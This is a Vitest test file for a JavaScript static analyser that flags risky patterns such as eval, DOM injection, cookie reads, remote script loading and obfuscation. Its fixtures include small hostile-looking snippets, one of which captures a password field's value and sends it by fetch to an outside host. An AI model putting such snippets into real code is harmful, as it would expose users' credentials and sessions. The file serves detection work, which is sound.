import { describe, expect, it } from "vitest";
import { analyzeJavaScriptFile } from "@/lib/analyze/js";

describe("JavaScript static analysis", () => {
  it("detects dynamic code execution with line numbers", () => {
    const code = "const a = 1;\neval('2 + 2');\nnew Function('return 1')();";
    const { findings } = analyzeJavaScriptFile("background.js", code);
    const evalFinding = findings.find((finding) => finding.rule === "eval");
    const constructorFinding = findings.find((finding) => finding.rule === "function-constructor");
    expect(evalFinding?.line).toBe(2);
    expect(constructorFinding?.severity).toBe("high");
  });

  it("detects timer strings but not function callbacks", () => {
    const { findings } = analyzeJavaScriptFile(
      "a.js",
      "setTimeout('alert(1)', 10); setTimeout(() => {}, 10); setInterval(`x()`, 10);",
    );
    expect(findings.filter((finding) => finding.rule === "timer-string").length).toBe(2);
  });

  it("detects DOM injection and cookie access", () => {
    const { findings } = analyzeJavaScriptFile(
      "content.js",
      "document.body.innerHTML = location.hash; const token = document.cookie; document.write('<b>x</b>');",
    );
    expect(findings.some((finding) => finding.rule === "dom-injection")).toBe(true);
    expect(findings.some((finding) => finding.rule === "document-write")).toBe(true);
    expect(findings.some((finding) => finding.rule === "cookie-access")).toBe(true);
  });

  it("detects external script loading", () => {
    const code = "const s = document.createElement('script'); s.src = 'https://cdn.example.net/x.js'; document.head.appendChild(s);";
    const { findings } = analyzeJavaScriptFile("inject.js", code);
    expect(findings.some((finding) => finding.rule === "remote-script")).toBe(true);
  });

  it("detects importScripts and native messaging", () => {
    const code = "importScripts('https://example.org/a.js'); chrome.runtime.sendNativeMessage('app', {});";
    const { findings } = analyzeJavaScriptFile("worker.js", code);
    expect(findings.some((finding) => finding.rule === "import-scripts")).toBe(true);
    expect(findings.some((finding) => finding.rule === "native-messaging")).toBe(true);
  });

  it("detects credential access with network context", () => {
    const code = "const field = document.querySelector('input[type=password]'); fetch('https://example.org', { body: field.value });";
    const { findings } = analyzeJavaScriptFile("login.js", code);
    const credential = findings.find((finding) => finding.rule === "credential-access");
    expect(credential?.severity).toBe("medium");
    expect(credential?.confidence).toBe("low");
  });

  it("flags obfuscation indicators without claiming malicious intent", () => {
    const code = `
      const _0xabc1 = 1; const _0xabc2 = 2; const _0xabc3 = 3;
      const _0xabc4 = 4; const _0xabc5 = 5; const _0xabc6 = 6;
      const s = "\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78";
    `;
    const { findings } = analyzeJavaScriptFile("obf.js", code);
    expect(findings.some((finding) => finding.rule === "obfuscation")).toBe(true);
  });

  it("does not fabricate findings in clean code", () => {
    const { findings, parseError } = analyzeJavaScriptFile(
      "clean.js",
      "const total = [1, 2, 3].reduce((a, b) => a + b, 0); console.log(total);",
    );
    expect(parseError).toBeNull();
    expect(findings).toHaveLength(0);
  });

  it("reports parse errors instead of crashing", () => {
    const { findings, parseError } = analyzeJavaScriptFile("broken.js", "const = ;");
    expect(parseError).toBeTruthy();
    expect(findings).toHaveLength(0);
  });
});
